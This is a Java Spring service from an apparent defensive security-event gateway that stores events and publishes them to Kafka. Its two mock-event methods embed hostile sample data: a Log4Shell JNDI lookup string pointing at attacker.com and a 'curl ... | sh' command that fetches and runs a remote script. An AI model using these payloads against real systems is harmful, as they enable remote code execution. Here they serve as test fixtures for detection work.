package com.autonomous.defense.gateway.service.impl;

import com.autonomous.defense.gateway.config.GatewayProperties;
import com.autonomous.defense.gateway.domain.entity.SecurityEventEntity;
import com.autonomous.defense.gateway.dto.SecurityEventDTO;
import com.autonomous.defense.gateway.exception.BusinessException;
import com.autonomous.defense.gateway.exception.ResourceNotFoundException;
import com.autonomous.defense.gateway.mapper.SecurityEventMapper;
import com.autonomous.defense.gateway.repository.SecurityEventRepository;
import com.autonomous.defense.gateway.service.SecurityEventService;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.kafka.core.KafkaTemplate;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.Instant;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

@Slf4j
@Service
@RequiredArgsConstructor
public class SecurityEventServiceImpl implements SecurityEventService {

    private final SecurityEventRepository repository;
    private final SecurityEventMapper mapper;
    private final KafkaTemplate<String, String> kafkaTemplate;
    private final GatewayProperties gatewayProperties;
    private final ObjectMapper objectMapper;

    @Override
    @Transactional
    public SecurityEventDTO createEvent(SecurityEventDTO request) {
        SecurityEventDTO normalized = normalize(request);
        SecurityEventEntity saved = repository.save(mapper.toEntity(normalized));
        publishToKafka(normalized);
        log.info("Security event saved and published. id={}, eventId={}", saved.getId(), saved.getEventId());
        return mapper.toDto(saved);
    }

    @Override
    public Page<SecurityEventDTO> listEvents(Pageable pageable) {
        return repository.findAll(pageable).map(mapper::toDto);
    }

    @Override
    public SecurityEventDTO getEventById(Long id) {
        SecurityEventEntity entity = repository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException("Security event not found: " + id));
        return mapper.toDto(entity);
    }

    @Override
    public SecurityEventDTO getEventByEventId(String eventId) {
        SecurityEventEntity entity = repository.findByEventId(eventId)
                .orElseThrow(() -> new ResourceNotFoundException("Security event not found by eventId: " + eventId));
        return mapper.toDto(entity);
    }

    @Override
    public SecurityEventDTO createMockLog4jEvent() {
        SecurityEventDTO dto = new SecurityEventDTO();
        dto.setSourceType("WAF");
        dto.setSubject("public-gateway");
        dto.setAction("http_request");
        dto.setObject("/api/search");
        dto.setSeverity("CRITICAL");
        dto.setRiskScore(0.95);
        dto.setLabels(List.of("log4shell", "rce", "t1190"));
        dto.setContext(new HashMap<>(Map.of(
                "payload", "${jndi:ldap://attacker.com/a}",
                "srcIp", "203.0.113.10",
                "userAgent", "Mozilla/5.0"
        )));
        return createEvent(dto);
    }

    @Override
    public SecurityEventDTO createMockShellEvent() {
        SecurityEventDTO dto = new SecurityEventDTO();
        dto.setSourceType("EDR");
        dto.setSubject("pod/payment-processor-5d8df");
        dto.setAction("shell_exec");
        dto.setObject("/bin/sh");
        dto.setSeverity("HIGH");
        dto.setRiskScore(0.88);
        dto.setLabels(List.of("container-escape", "suspicious-shell", "t1059"));
        dto.setContext(new HashMap<>(Map.of(
                "cluster", "prod-cn-1",
                "namespace", "payments",
                "command", "sh -c curl http://x.x.x.x/s.sh | sh"
        )));
        return createEvent(dto);
    }

    private SecurityEventDTO normalize(SecurityEventDTO request) {
        if (request.getRiskScore() == null) {
            request.setRiskScore(0.5d);
        }
        if (request.getTimestamp() == null) {
            request.setTimestamp(Instant.now());
        }
        if (request.getEventId() == null || request.getEventId().isBlank()) {
            request.setEventId("evt-" + UUID.randomUUID());
        }
        if (request.getContext() == null) {
            request.setContext(new HashMap<>());
        } else {
            request.setContext(new HashMap<>(request.getContext()));
        }
        request.getContext().putIfAbsent("ingestTime", Instant.now().toString());
        request.getContext().putIfAbsent("normalizedBy", "defense-gateway");
        request.getContext().putIfAbsent("schemaVersion", "1.0");
        return request;
    }

    private void publishToKafka(SecurityEventDTO event) {
        String payload;
        try {
            payload = objectMapper.writeValueAsString(event);
        } catch (JsonProcessingException e) {
            throw new BusinessException("Failed to serialize event for Kafka");
        }
        kafkaTemplate.send(gatewayProperties.getKafka().getEventTopic(), event.getEventId(), payload);
        log.info("Security event published to Kafka topic={}, key={}", gatewayProperties.getKafka().getEventTopic(), event.getEventId());
    }
}

